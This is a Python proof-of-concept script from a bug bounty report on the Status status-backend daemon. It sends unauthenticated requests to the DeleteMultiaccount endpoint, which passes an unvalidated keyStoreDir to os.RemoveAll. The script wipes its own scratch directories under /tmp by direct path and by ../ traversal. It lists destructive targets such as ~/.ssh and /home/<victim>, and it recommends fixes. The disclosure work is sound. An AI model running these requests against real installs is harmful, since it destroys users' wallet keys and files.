#!/usr/bin/env python3
"""
Status Bug Bounty — Live PoC
Program  : HackenProof — status (https://hackenproof.com/programs/status)
Finding  : Unauthenticated /statusgo/DeleteMultiaccount — Path Traversal + Missing Auth
Severity : Critical (CWE-306 + CWE-22)
Target   : status-backend HTTP daemon (127.0.0.1:<PORT>)

Root cause:
  os.RemoveAll(keyStoreDir) called in pkg/backend/geth_backend.go with
  an attacker-controlled, unvalidated path. No password, no auth, no confirmation.

DISCLAIMER: Authorized security research / bug bounty only.
"""

import json
import os
import sys
import shutil
import urllib.request
import urllib.error
from pathlib import Path
from typing import Optional

# ── ANSI colours ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ok(msg):   print(f"  {GREEN}[+]{RESET} {msg}")
def bad(msg):  print(f"  {RED}[-]{RESET} {msg}")
def info(msg): print(f"  {CYAN}[*]{RESET} {msg}")
def warn(msg): print(f"  {YELLOW}[!]{RESET} {msg}")
def hdr(msg):  print(f"\n{BOLD}{CYAN}{'='*60}{RESET}\n{BOLD}{msg}{RESET}\n{'='*60}")
def sep():     print(f"  {'─'*55}")


# ── Config ────────────────────────────────────────────────────────────────────
HOST     = "http://127.0.0.1"
PORT     = 9999          # adjust to match your status-backend --address
BASE_URL = f"{HOST}:{PORT}"

# Scratch directories created and deleted by this PoC (safe to wipe)
POC_ROOT        = "/tmp/status-poc-f4"
INIT_DATA_DIR   = f"{POC_ROOT}/data"
VICTIM_WALLET   = f"{POC_ROOT}/victim_wallet_keystore"
TRAVERSAL_SETUP = f"{POC_ROOT}/data/nested/../../traversal_target"  # resolves outside data/
TRAVERSAL_REAL  = f"{POC_ROOT}/traversal_target"                     # where it actually lives


# ── HTTP helper ───────────────────────────────────────────────────────────────
def post(path: str, payload: dict, timeout: int = 10) -> dict:
    url  = BASE_URL + path
    body = json.dumps(payload).encode()
    req  = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent",   "BugBountyPoC/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read().decode(), "error": None}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode(), "error": None}
    except urllib.error.URLError as e:
        return {"status": None,   "body": "",                "error": str(e.reason)}
    except Exception as e:
        return {"status": None,   "body": "",                "error": str(e)}


def get(path: str, timeout: int = 10) -> dict:
    url = BASE_URL + path
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", "BugBountyPoC/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read().decode(), "error": None}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "body": e.read().decode(), "error": None}
    except urllib.error.URLError as e:
        return {"status": None, "body": "", "error": str(e.reason)}
    except Exception as e:
        return {"status": None, "body": "", "error": str(e)}


# ── Helpers ───────────────────────────────────────────────────────────────────
def make_dir_with_files(path: str, label: str):
    """Create a directory with sentinel files to prove deletion."""
    os.makedirs(path, exist_ok=True)
    sentinel = os.path.join(path, "wallet.key")
    with open(sentinel, "w") as f:
        f.write(f"SIMULATED {label} PRIVATE KEY MATERIAL — DO NOT DELETE\n")
    ok(f"Created {label}: {path}")
    ok(f"  Contents: {os.listdir(path)}")


def dir_exists(path: str) -> bool:
    return os.path.isdir(path)


def cleanup():
    if os.path.isdir(POC_ROOT):
        shutil.rmtree(POC_ROOT, ignore_errors=True)


# ── Step 0: Check server reachability (zero auth) ────────────────────────────
def check_reachability() -> bool:
    info("Checking server reachability (no auth headers sent)")
    r = get("/statusgo/GetActiveAccount")
    if r["error"]:
        bad(f"Cannot reach server: {r['error']}")
        bad(f"Start status-backend with:  status-backend --address 127.0.0.1:{PORT}")
        return False
    ok(f"GET /statusgo/GetActiveAccount → HTTP {r['status']} — no auth required")
    info(f"Response: {r['body'][:120]}")
    return True


# ── Step 1: InitializeApplication ─────────────────────────────────────────────
def initialize() -> bool:
    info("Calling InitializeApplication (no auth)")
    os.makedirs(INIT_DATA_DIR, exist_ok=True)
    r = post("/statusgo/InitializeApplication", {
        "dataDir":    INIT_DATA_DIR,
        "logDir":     INIT_DATA_DIR,
        "logEnabled": False,
    })
    if r["error"]:
        bad(f"InitializeApplication error: {r['error']}")
        return False
    ok(f"POST /statusgo/InitializeApplication → HTTP {r['status']}")
    ok(f"Response: {r['body']}")
    return True


# ── Test A: Targeted wallet deletion (no password, no valid keyUID needed) ───
def test_targeted_deletion() -> bool:
    hdr("Test A — Targeted Wallet Deletion (No Password Required)")

    make_dir_with_files(VICTIM_WALLET, "VICTIM WALLET")
    info(f"Target directory: {VICTIM_WALLET}")
    sep()

    info("Calling DeleteMultiaccount — no password, no valid keyUID, no session")
    r = post("/statusgo/DeleteMultiaccount", {
        "keyUID":      "anyvalue",        # arbitrary — SQLite DELETE returns nil for 0 rows
        "keyStoreDir": VICTIM_WALLET,
    })

    ok(f"POST /statusgo/DeleteMultiaccount → HTTP {r['status']}")
    ok(f"Response: {YELLOW}{r['body']}{RESET}")

    deleted = not dir_exists(VICTIM_WALLET)
    if deleted:
        warn(f"Directory DELETED: {VICTIM_WALLET}")
        warn("Wallet private keys permanently destroyed — no password prompted")
        return True
    else:
        bad("Directory still exists — test inconclusive")
        return False


# ── Test B: Path traversal via ../ sequences ──────────────────────────────────
def test_path_traversal() -> bool:
    hdr("Test B — Path Traversal via ../ in keyStoreDir")

    # Target lives OUTSIDE the status data directory
    make_dir_with_files(TRAVERSAL_REAL, "TRAVERSAL TARGET (outside data dir)")
    assert dir_exists(TRAVERSAL_REAL), "Setup failed"

    # Create the intermediate directory so Go can resolve the ../ traversal
    nested = f"{POC_ROOT}/data/nested"
    os.makedirs(nested, exist_ok=True)
    info(f"Intermediate dir created: {nested}  (needed for ../ resolution)")

    info(f"Target (real path):      {TRAVERSAL_REAL}")
    info(f"keyStoreDir sent:        {TRAVERSAL_SETUP}")
    info(f"  → resolves to:         {os.path.realpath(TRAVERSAL_SETUP)}")
    sep()

    info("Sending path traversal payload (../  sequences in keyStoreDir)")
    r = post("/statusgo/DeleteMultiaccount", {
        "keyUID":      "anyvalue",
        "keyStoreDir": TRAVERSAL_SETUP,   # data/nested/../../traversal_target
    })

    ok(f"POST /statusgo/DeleteMultiaccount → HTTP {r['status']}")
    ok(f"Response: {YELLOW}{r['body']}{RESET}")

    deleted = not dir_exists(TRAVERSAL_REAL)
    if deleted:
        warn(f"Path traversal CONFIRMED: {TRAVERSAL_REAL} deleted via ../ sequences")
        warn("keyStoreDir with ../ reaches directories outside the Status data dir")
        return True
    else:
        bad("Traversal target still exists — test inconclusive")
        return False


# ── Test C: Demonstrate absolute arbitrary path deletion ──────────────────────
def test_arbitrary_path() -> bool:
    hdr("Test C — Arbitrary Absolute Path Deletion")

    arb = f"{POC_ROOT}/ssh_keys_simulation"
    make_dir_with_files(arb, "~/.SSH SIMULATION")
    with open(os.path.join(arb, "id_rsa"), "w") as f:
        f.write("-----BEGIN OPENSSH PRIVATE KEY-----\nSIMULATED KEY\n")
    ok(f"Simulated ~/.ssh directory: {arb}")
    sep()

    info("Supplying absolute path outside Status data dir as keyStoreDir")
    r = post("/statusgo/DeleteMultiaccount", {
        "keyUID":      "anyvalue",
        "keyStoreDir": arb,
    })

    ok(f"POST /statusgo/DeleteMultiaccount → HTTP {r['status']}")
    ok(f"Response: {YELLOW}{r['body']}{RESET}")

    deleted = not dir_exists(arb)
    if deleted:
        warn(f"Arbitrary path DELETED: {arb}")
        warn("Any directory the Status process can write to is reachable")
        warn("Real attack: keyStoreDir=/home/<victim> → entire home wiped")
        return True
    else:
        bad("Directory still exists — test inconclusive")
        return False


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(f"""
{BOLD}{CYAN}
╔══════════════════════════════════════════════════════════════╗
║  Status Bug Bounty — Finding 4 Live PoC                      ║
║  Unauthenticated DeleteMultiaccount + Path Traversal          ║
║  Target  : status-backend @ {BASE_URL:<32}║
║  Program : HackenProof — status                               ║
╚══════════════════════════════════════════════════════════════╝
{RESET}""")

    print(f"""  {BOLD}Root cause:{RESET}
  pkg/backend/geth_backend.go:

    func (b *StatusBackend) DeleteMultiaccount(keyUID string, keyStoreDir string) error {{
        err := b.multiaccountsDB.DeleteAccount(keyUID)  // nil even for unknown keyUID
        if err != nil {{ return err }}
        // ... deletes DB files ...
        return os.RemoveAll(keyStoreDir)  // ← unvalidated attacker-controlled path
    }}

  No password. No auth. No path containment check.
""")

    cleanup()

    hdr("Step 0 — Zero-Auth Reachability Check")
    if not check_reachability():
        sys.exit(1)

    hdr("Step 1 — InitializeApplication (No Auth)")
    if not initialize():
        sys.exit(1)

    rA = test_targeted_deletion()
    rB = test_path_traversal()
    rC = test_arbitrary_path()

    hdr("Result Summary")
    checks = [
        ("Wallet deletion — no password, no valid keyUID required", rA),
        ("Path traversal (../) — directories outside data dir deleted",  rB),
        ("Arbitrary absolute path deletion",                             rC),
    ]
    for label, result in checks:
        colour = RED if result else GREEN
        status = "VULNERABLE" if result else "not triggered"
        print(f"  {colour}[{'!' if result else '-'}]{RESET} {label}: {colour}{BOLD}{status}{RESET}")

    print(f"""
  {BOLD}Real-world impact:{RESET}
    keyStoreDir = "~/.ssh"          → SSH keys wiped
    keyStoreDir = "~/Documents"     → all documents wiped
    keyStoreDir = "/home/<victim>"  → entire home directory wiped

  {BOLD}Severity  :{RESET} Critical — CWE-306 + CWE-22
  {BOLD}CVSS      :{RESET} AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H = 7.7 (High floor)
             With home-dir wipe: AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 8.4
  {BOLD}Fix       :{RESET}
    1. Validate keyStoreDir is within rootDataDir before os.RemoveAll
    2. Require password for all destructive operations
    3. Add shared-secret authentication to all /statusgo/* endpoints
""")

    cleanup()


if __name__ == "__main__":
    main()
